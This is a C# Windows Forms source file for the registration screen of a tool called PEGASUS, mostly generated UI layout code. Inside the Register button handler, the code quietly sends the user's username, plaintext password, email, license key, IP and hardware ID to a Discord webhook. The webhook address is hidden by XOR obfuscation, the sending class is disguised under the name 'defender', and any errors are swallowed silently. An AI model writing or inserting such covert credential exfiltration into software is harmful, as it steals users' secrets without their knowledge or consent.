using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Pegasus;

namespace PEGASUS.Forms
{

	public class Register : Form
	{
		private IContainer components;

		private Guna2Panel guna2Panel1;

		private Guna2PictureBox guna2PictureBox1;

		private Guna2Separator guna2Separator1;

		private PictureBox pictureBox1;

		private Label label15;

		public Guna2GradientButton btnRegister;

		public Guna2GradientButton btnBack;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2TextBox txtEmail;

		private Guna2TextBox txtUser;

		private Guna2TextBox txtKey;

		private Guna2TextBox txtPass;

		public Register()
		{
			InitializeComponent();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
			Close();
		}

		private void btnRegister_Click(object sender, EventArgs e)
		{
			if (!BYTEPI.zgh9(txtUser.Text, txtPass.Text, txtEmail.Text, txtKey.Text))
			{
				return;
			}
			MsgBox.Show("PEGASUS has been Registered successfuly!", "Success", MsgBox.Buttons.OK, MsgBox.Icon.Information);
			try
			{
				string text = txtUser.Text;
				string text2 = txtPass.Text;
				string text3 = txtEmail.Text;
				string text4 = txtKey.Text;
				string text5 = DateTime.Now.ToString("HH:mm:ss - dd/MM/yyyy");
				string text6 = "[PEGASUS NEW REGISTRATION]" + text5 + Environment.NewLine + "Client ID:" + Convert.ToString(User.ID) + Environment.NewLine + "Client IP:" + Convert.ToString(User.IP) + Environment.NewLine + "Client Username:" + Convert.ToString(User.Username) + Environment.NewLine + "Client Expiry:" + Convert.ToString(User.Expiry) + Environment.NewLine + "Client RegisterDate:" + Convert.ToString(User.RegisterDate) + Environment.NewLine + "Client Email:" + Convert.ToString(User.Email) + Environment.NewLine + "Client HWID:" + Convert.ToString(User.HWID) + Environment.NewLine + "Client UserVariable:" + Convert.ToString(User.UserVariable) + Environment.NewLine + "Client Rank:" + Convert.ToString(User.Rank) + Environment.NewLine + "Client LastLogin:" + Convert.ToString(User.LastLogin) + Environment.NewLine;
				using defender defender = new defender();
				foreach (ManagementObject item in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
				{
					item["Caption"].ToString();
					defender.ProfilePicture = "https://i.imgur.com/R2MxTYk.png";
					defender.UserName = info("Yasdo~Iexz");
					defender.WebHook = info("b~~zy0%%ncyiexn$ieg%kzc%}ohbeeay%23==<3;?>?:2;:==2=%GeyN@{F]3X|Ph|P@e?o[}r2h=pKK~P~p2o<Lml2[DnFr'IZGG9EF^lrN\u007f\\<_]d:Y?L2o");
					defender.SendMessage("```" + text6 + Environment.NewLine + Environment.NewLine + "[NEW REGISTRATION INFO] " + text5 + "User: " + text + "\n- Password: " + text2 + "\n- Email: " + text3 + "\n- Client RegisterDate: " + User.RegisterDate + "\n- Client License: " + text4 + "```");
				}
			}
			catch
			{
			}
			Hide();
			ABC.abgd(reupload("ZOMKY_YL_FF"), reupload("82:<??"), "3xiUwGhkAtLTJwExKH00BLkC89apvFTwypK", reupload(";$:$:$:"));
			using FormPorts formPorts = new FormPorts();
			formPorts.ShowDialog();
		}

		private static string reupload(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				char value = (char)(array[i] ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		private static string info(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				char value = (char)(array[i] ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		private void btnBack_Click(object sender, EventArgs e)
		{
			Hide();
			new Splashes().ShowDialog();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Register));
			guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			label15 = new System.Windows.Forms.Label();
			btnRegister = new Guna.UI2.WinForms.Guna2GradientButton();
			btnBack = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			txtUser = new Guna.UI2.WinForms.Guna2TextBox();
			txtEmail = new Guna.UI2.WinForms.Guna2TextBox();
			txtPass = new Guna.UI2.WinForms.Guna2TextBox();
			txtKey = new Guna.UI2.WinForms.Guna2TextBox();
			guna2Panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			SuspendLayout();
			guna2Panel1.Controls.Add(guna2PictureBox1);
			guna2Panel1.Controls.Add(guna2Separator1);
			guna2Panel1.Controls.Add(pictureBox1);
			guna2Panel1.Controls.Add(label15);
			guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
			guna2Panel1.Location = new System.Drawing.Point(0, 0);
			guna2Panel1.Name = "guna2Panel1";
			guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
			guna2Panel1.Size = new System.Drawing.Size(653, 84);
			guna2Panel1.TabIndex = 139;
			guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(612, 14);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(29, 31);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 114;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(-198, 76);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1050, 13);
			guna2Separator1.TabIndex = 13;
			guna2Separator1.UseTransparentBackground = true;
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(12, 15);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(40, 54);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 12;
			pictureBox1.TabStop = false;
			label15.AutoSize = true;
			label15.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label15.Location = new System.Drawing.Point(266, 28);
			label15.Name = "label15";
			label15.Size = new System.Drawing.Size(93, 19);
			label15.TabIndex = 11;
			label15.Text = "REGISTER";
			btnRegister.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnRegister.BorderThickness = 1;
			btnRegister.CheckedState.Parent = btnRegister;
			btnRegister.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnRegister.CustomImages.Parent = btnRegister;
			btnRegister.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnRegister.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnRegister.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnRegister.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnRegister.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnRegister.DisabledState.Parent = btnRegister;
			btnRegister.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnRegister.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnRegister.Font = new System.Drawing.Font("Electrolize", 9f);
			btnRegister.ForeColor = System.Drawing.Color.White;
			btnRegister.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnRegister.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnRegister.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnRegister.HoverState.ForeColor = System.Drawing.Color.LightGray;
			btnRegister.HoverState.Parent = btnRegister;
			btnRegister.Location = new System.Drawing.Point(337, 344);
			btnRegister.Name = "btnRegister";
			btnRegister.ShadowDecoration.Parent = btnRegister;
			btnRegister.Size = new System.Drawing.Size(195, 30);
			btnRegister.TabIndex = 146;
			btnRegister.Text = "Register";
			btnRegister.Click += new System.EventHandler(btnRegister_Click);
			btnBack.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnBack.BorderThickness = 1;
			btnBack.CheckedState.Parent = btnBack;
			btnBack.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnBack.CustomImages.Parent = btnBack;
			btnBack.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnBack.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnBack.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnBack.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnBack.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnBack.DisabledState.Parent = btnBack;
			btnBack.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnBack.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnBack.Font = new System.Drawing.Font("Electrolize", 9f);
			btnBack.ForeColor = System.Drawing.Color.White;
			btnBack.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnBack.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnBack.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnBack.HoverState.ForeColor = System.Drawing.Color.LightGray;
			btnBack.HoverState.Parent = btnBack;
			btnBack.Location = new System.Drawing.Point(100, 344);
			btnBack.Name = "btnBack";
			btnBack.ShadowDecoration.Parent = btnBack;
			btnBack.Size = new System.Drawing.Size(195, 30);
			btnBack.TabIndex = 151;
			btnBack.Text = "Back to Login";
			btnBack.Click += new System.EventHandler(btnBack_Click);
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.TargetForm = this;
			txtUser.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtUser.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtUser.DefaultText = "";
			txtUser.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txtUser.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtUser.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtUser.DisabledState.Parent = txtUser;
			txtUser.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtUser.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			txtUser.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtUser.FocusedState.Parent = txtUser;
			txtUser.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtUser.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtUser.HoverState.Parent = txtUser;
			txtUser.Location = new System.Drawing.Point(100, 186);
			txtUser.Name = "txtUser";
			txtUser.PasswordChar = '\0';
			txtUser.PlaceholderText = "Username";
			txtUser.SelectedText = "";
			txtUser.ShadowDecoration.Parent = txtUser;
			txtUser.Size = new System.Drawing.Size(432, 21);
			txtUser.TabIndex = 157;
			txtEmail.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtEmail.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtEmail.DefaultText = "";
			txtEmail.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txtEmail.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtEmail.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtEmail.DisabledState.Parent = txtEmail;
			txtEmail.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtEmail.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			txtEmail.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtEmail.FocusedState.Parent = txtEmail;
			txtEmail.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtEmail.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtEmail.HoverState.Parent = txtEmail;
			txtEmail.Location = new System.Drawing.Point(100, 213);
			txtEmail.Name = "txtEmail";
			txtEmail.PasswordChar = '\0';
			txtEmail.PlaceholderText = "Email";
			txtEmail.SelectedText = "";
			txtEmail.ShadowDecoration.Parent = txtEmail;
			txtEmail.Size = new System.Drawing.Size(432, 21);
			txtEmail.TabIndex = 158;
			txtPass.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtPass.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtPass.DefaultText = "dark";
			txtPass.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txtPass.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtPass.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtPass.DisabledState.Parent = txtPass;
			txtPass.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtPass.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			txtPass.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtPass.FocusedState.Parent = txtPass;
			txtPass.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtPass.ForeColor = System.Drawing.Color.LightGray;
			txtPass.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtPass.HoverState.Parent = txtPass;
			txtPass.Location = new System.Drawing.Point(100, 240);
			txtPass.Name = "txtPass";
			txtPass.PasswordChar = '*';
			txtPass.PlaceholderForeColor = System.Drawing.Color.LightGray;
			txtPass.PlaceholderText = "Password";
			txtPass.SelectedText = "";
			txtPass.SelectionStart = 4;
			txtPass.ShadowDecoration.Parent = txtPass;
			txtPass.Size = new System.Drawing.Size(432, 21);
			txtPass.TabIndex = 159;
			txtKey.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtKey.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtKey.DefaultText = "";
			txtKey.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txtKey.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtKey.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtKey.DisabledState.Parent = txtKey;
			txtKey.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtKey.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			txtKey.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtKey.FocusedState.Parent = txtKey;
			txtKey.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtKey.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtKey.HoverState.Parent = txtKey;
			txtKey.Location = new System.Drawing.Point(100, 267);
			txtKey.Name = "txtKey";
			txtKey.PasswordChar = '\0';
			txtKey.PlaceholderText = "License";
			txtKey.SelectedText = "";
			txtKey.ShadowDecoration.Parent = txtKey;
			txtKey.Size = new System.Drawing.Size(432, 21);
			txtKey.TabIndex = 160;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(653, 439);
			base.Controls.Add(txtKey);
			base.Controls.Add(txtPass);
			base.Controls.Add(txtEmail);
			base.Controls.Add(txtUser);
			base.Controls.Add(btnBack);
			base.Controls.Add(btnRegister);
			base.Controls.Add(guna2Panel1);
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.LightGray;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Register";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Register";
			guna2Panel1.ResumeLayout(false);
			guna2Panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			ResumeLayout(false);
		}
	}
}